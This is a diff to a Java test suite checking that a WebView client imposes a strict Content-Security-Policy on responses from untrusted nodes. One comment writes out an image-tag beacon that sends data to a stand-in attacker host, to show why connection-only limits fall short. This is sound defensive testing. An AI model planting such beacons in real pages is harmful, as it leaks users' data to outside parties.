@@ -57,22 +57,25 @@ public class QdnBridgeWebViewClientTest {
     }
 
     @Test
-    public void injectedHtmlGetsAHomeConnectionPolicyWhenTheNodeOmitsModernCsp() {
+    public void injectedHtmlGetsTheFullMinimumPolicyWhenTheNodeOmitsModernCsp() {
         Map<String, String> headers = new HashMap<>();
         headers.put("X-Content-Security-Policy", "default-src 'self';");
 
         Map<String, String> prepared =
             QdnBridgeWebViewClient.prepareProxiedResponseHeaders(headers);
 
+        // The legacy X- header is NOT a modern policy and WebView does not
+        // enforce it, so there is nothing here for a connection-only policy to
+        // intersect with: Home must supply the whole sandbox.
         assertEquals(
-            QdnBridgeWebViewClient.HOME_QDN_CONNECTION_POLICY,
+            QdnBridgeWebViewClient.HOME_QDN_MINIMUM_POLICY,
             prepared.get("Content-Security-Policy")
         );
         assertEquals("default-src 'self';", prepared.get("X-Content-Security-Policy"));
     }
 
     @Test
-    public void nonInjectedProxyResponsesAlsoGetTheHomeConnectionPolicy() {
+    public void nonInjectedProxyResponsesAlsoGetTheHomePolicy() {
         for (String contentType : Arrays.asList("text/html", "text/javascript", "application/wasm")) {
             Map<String, String> headers = new HashMap<>();
             headers.put("Content-Type", contentType);
@@ -82,10 +85,51 @@ public class QdnBridgeWebViewClientTest {
 
             assertEquals(
                 contentType + " proxy response must receive the Home CSP",
-                QdnBridgeWebViewClient.HOME_QDN_CONNECTION_POLICY,
+                QdnBridgeWebViewClient.HOME_QDN_MINIMUM_POLICY,
                 prepared.get("Content-Security-Policy")
             );
         }
+    }
+
+    @Test
+    public void aNodeThatOmitsCspDoesNotGetAWEAKERSandboxThanOneThatSetsIt() {
+        // The point of the minimum policy. A connection-only policy would leave
+        // <img src="https://attacker/?d=…"> available — a beacon that needs no
+        // WebSocket and no fetch — so a node that simply omits the header would
+        // end up LESS constrained than one that sets a policy. Home connects to
+        // public nodes it does not control, so that is a live threat, not a
+        // hypothetical.
+        Map<String, String> noUpstream =
+            QdnBridgeWebViewClient.prepareProxiedResponseHeaders(new HashMap<>());
+        String policy = noUpstream.get("Content-Security-Policy");
+        for (String directive : Arrays.asList("img-src", "media-src", "font-src", "worker-src",
+                "default-src", "connect-src")) {
+            assertTrue(
+                directive + " must be bounded when the node supplies no policy",
+                policy.contains(directive)
+            );
+        }
+        // And it names no external origin.
+        assertFalse(policy.contains("http://"));
+        assertFalse(policy.contains("https://"));
+        assertFalse(policy.contains(" ws:"));
+        assertFalse(policy.contains(" wss:"));
+    }
+
+    @Test
+    public void anUpstreamPolicyIsIntersectedRatherThanReplaced() {
+        Map<String, String> headers = new HashMap<>();
+        headers.put("Content-Security-Policy", "default-src 'self'; img-src https://node.example;");
+
+        String policy = QdnBridgeWebViewClient
+            .prepareProxiedResponseHeaders(headers)
+            .get("Content-Security-Policy");
+
+        // Core's policy survives — Home does not weaken what the node asked for
+        // — and Home's connection policy is appended as a second, independent
+        // policy, which the browser enforces as an intersection.
+        assertTrue(policy.startsWith("default-src 'self'; img-src https://node.example;"));
+        assertTrue(policy.endsWith(QdnBridgeWebViewClient.HOME_QDN_CONNECTION_POLICY));
     }
 
     @Test
